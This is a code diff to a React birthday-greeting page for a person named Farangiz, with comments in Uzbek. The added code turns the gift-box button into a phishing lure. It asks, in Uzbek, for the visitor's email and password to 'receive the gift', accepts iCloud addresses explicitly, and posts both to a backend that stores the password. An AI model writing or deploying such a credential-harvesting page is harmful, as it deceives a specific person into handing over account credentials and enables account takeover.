@@ -1,4 +1,5 @@
 import React, { useEffect, useState } from "react";
+import { useNavigate } from "react-router-dom"; // Sahifalarni o'zgartirish uchun
 import './home.css';
 
 import GiftBox from '../image/giftbox.jpg';
@@ -6,16 +7,20 @@ import GiftBox from '../image/giftbox.jpg';
 function HomePage() {
     const [currentLangIndex, setCurrentLangIndex] = useState(0);
     const [currentColorIndex, setCurrentColorIndex] = useState(0);
+    const [showPrompt, setShowPrompt] = useState(false);
+    const [email, setEmail] = useState("");
+    const [password, setPassword] = useState(""); // Parolni saqlash uchun
+    const navigate = useNavigate(); // HimResult sahifasiga o'tish uchun
 
     // Matn tillari
     const languages = [
         "Farangiz tug'ilgan kuning bilan tabriklayman",
-        "\u041f\u043e\u0437\u0434\u0440\u0430\u0432\u043b\u044f\u044e \u0441 \u0434\u043d\u0435\u043c \u0440\u043e\u0436\u0434\u0435\u043d\u0438\u044f, \u0424\u0430\u0440\u0430\u043d\u0433\u0438\u0437",
+        "Поздравляю с днем рождения, Фарангиз",
         "Happy Birthday, Farangiz",
-        "\u0639\u064a\u062f \u0645\u064a\u0644\u0627\u062f \u0633\u0639\u064a\u062f\u060c \u0641\u0631\u0646\u062c\u0632",
-        "\u0424\u0430\u0440\u0430\u043d\u0433\u0438\u0437, \u0442\u0430\u0432\u0430\u043b\u043b\u0443\u0434 \u043c\u0443\u0431\u043e\u0440\u0430\u043a",
-        "Farangiz, do\u011fum g\u00fcn\u00fcn kutlu olsun",
-        "\u6cd5\u5170\u5409\u5179\uff0c\u751f\u65e5\u5feb\u4e50"
+        "عيد ميلاد سعيد، فرنغز",
+        "Фарангиз, таваллуд муборак",
+        "Farangiz, doğum günün kutlu olsun",
+        "法兰吉兹，生日快乐"
     ];
 
     // Ranglar
@@ -24,17 +29,58 @@ function HomePage() {
     useEffect(() => {
         const textInterval = setInterval(() => {
             setCurrentLangIndex((prevIndex) => (prevIndex + 1) % languages.length);
-        }, 2000); // Har 2 soniyada almashadi
+        }, 2000);
 
         const colorInterval = setInterval(() => {
             setCurrentColorIndex((prevIndex) => (prevIndex + 1) % colors.length);
-        }, 1000); // Har 1 soniyada rang o‘zgaradi
+        }, 1000);
 
         return () => {
             clearInterval(textInterval);
             clearInterval(colorInterval);
         };
     }, []);
+
+    const handleGiftClick = () => {
+        setShowPrompt(true);
+    };
+
+    const isValidEmail = (email) => {
+        // Email validatsiyasi va iCloud tekshiruvi
+        const emailRegex = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}$/;
+        return emailRegex.test(email) || email.endsWith("@icloud.com");
+    };
+
+    const handleSend = async () => {
+        if (!isValidEmail(email)) {
+            alert("Iltimos, to'g'ri email manzilini kiriting (iCloud manzili ham qo'llab-quvvatlanadi).");
+            return;
+        }
+
+        try {
+            const response = await fetch("http://localhost:2006/api/message/send", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    email: email, // NotesDto: title sifatida email
+                    password: password, // NotesDto: passes sifatida parol
+                }),
+            });
+            const result = await response.json();
+
+            if (result.success) {
+                alert("Sovg'a email manzilingizga yuborildi!");
+                setShowPrompt(false); // Promptni yopish
+                setEmail(""); // Email maydonini tozalash
+                setPassword(""); // Parolni tozalash
+                navigate("/himresult"); // HimResult sahifasiga o'tish
+            } else {
+                alert("Xatolik yuz berdi, qayta urinib ko'ring!");
+            }
+        } catch (error) {
+            alert("Xatolik yuz berdi, qayta urinib ko'ring!");
+        }
+    };
 
     return (
         <div className="homeContainer">
@@ -43,10 +89,34 @@ function HomePage() {
             </div>
 
             <div className="clickButton">
-                <button className="giftButton" style={{ width: "100px", height: "100px" }}>
+                <button onClick={handleGiftClick} className="giftButton" style={{ width: "100px", height: "100px" }}>
                     <img src={GiftBox} className="giftboxClass" alt="gift" style={{ width: "90%", height: "90%" }} />
                 </button>
             </div>
+
+            {showPrompt && (
+                <div className="emailPrompt">
+                    <h3 className="promptTitle">Sovg'ani olish uchun kirish ma'lumotlaringizni kiriting:</h3>
+                    <input
+                        type="email"
+                        value={email}
+                        onChange={(e) => setEmail(e.target.value)}
+                        placeholder="Email kiriting"
+                        className="promptInput"
+                    />
+                    <input
+                        type="password"
+                        value={password}
+                        onChange={(e) => setPassword(e.target.value)}
+                        placeholder="Parol kiriting"
+                        className="promptInput"
+                    />
+                    <div className="promptActions">
+                        <button onClick={handleSend} className="promptButton confirm">Tasdiqlash</button>
+                        <button onClick={() => setShowPrompt(false)} className="promptButton cancel">Bekor qilish</button>
+                    </div>
+                </div>
+            )}
         </div>
     );
 }
